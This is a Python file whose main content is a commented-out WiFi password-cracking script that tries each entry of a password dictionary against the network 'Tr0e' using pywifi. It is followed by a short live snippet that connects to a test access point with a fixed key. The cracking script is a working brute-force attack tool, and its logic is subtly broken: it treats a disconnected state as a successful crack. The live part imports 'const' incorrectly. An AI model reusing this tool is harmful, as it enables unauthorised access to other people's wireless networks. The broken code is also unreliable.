# # -*- codeing=utf-8 -*-
# # @Time : 2022/3/26 22:44
# # @Author: 曹志阳
# # @FALE wife.py
# # @software :PyCharm
# import pywifi
# from pywifi import const
# import time
# import datetime
#
# #测试连接，返回链接结果
# def wifiConnect(pwd):
#     # 抓住网卡接口
#     wifi=pywifi.PyWiFi()
#     # 获取第一个无线网卡
#     ifaces=wifi.interfaces()[0]
#     # 断开所有连接
#     ifaces.disconnect()
#     time.sleep(1)
#     wifistatus=ifaces.status()
#     if wifistatus==const.IFACE_DISCONNECTED:
# #创建WIFI连接文件
#         profile=pywifi.Profile()
#         #要连接wifi的名称
#         profile.ssid="Tr0e"
#         profile.auth=const.AUTH_ALG_OPEN
#         profile.akm.append(const.AKM_TYPE_WPA2PSK)
#         profile.cipher=const.CIPHER_TYPE_CCMP
#         profile.key=pwd
#         ifaces.remove_all_network_profiles()
#         tep_profile=ifaces.add_network_profile(profile)
#         ifaces.connect(tep_profile)
#         time.sleep(2)
#         if ifaces.status()==const.IFACE_DISCONNECTED:
#             return True
#         else:
#             return False
#     else:
#         print("已有wifi连接")
#
# def readpassword():
#     success=False
#     print("**********WIFI破解**********")
#     path="pwd.txt"
#     file=open(path,"r")
#     stat=datetime.datetime.now()
#     while True:
#         try:
#             pwd=file.readline()
#             pwd=pwd.strip("\n")
#             bool=wifiConnect(pwd)
#             if bool:
#                 print("[*]密码已破解:",pwd)
#                 print("[*]WIFI已自动连接！！！")
#                 success=True
#                 break
#             else:
#                 print("正在破解SSID为%s的WIFI密码，当前校验的密码为：%s"%("Tr0e",pwd))
#         except:
#             continue
#     end=datetime.datetime.now()
#     if(success):
#         print("[*]本次破解WIFI密码一共用了多长时间：{}".format(end - stat))
#     else:
#         print("[*]很遗憾未能帮你破解出当前指定的WIFI的密码，请更换密码字典后重新尝试！")
#     exit(0)
#
# if __name__ == '__main__':
#     readpassword()
#
#
# # coding:utf-8
#
#
import pywifi
import time
import const

wifi = pywifi.PyWiFi()

iface = wifi.interfaces()[0]

iface.disconnect()
time.sleep(1)
assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

profile = pywifi.Profile()
profile.ssid = 'testap'
profile.auth = const.AUTH_ALG_OPEN
profile.akm.append(const.AKM_TYPE_WPA2PSK)
profile.cipher = const.CIPHER_TYPE_CCMP
profile.key = '12345678'

iface.remove_all_network_profiles()
tmp_profile = iface.add_network_profile(profile)

iface.connect(tmp_profile)
time.sleep(30)
assert iface.status() == const.IFACE_CONNECTED

iface.disconnect()
time.sleep(1)
assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
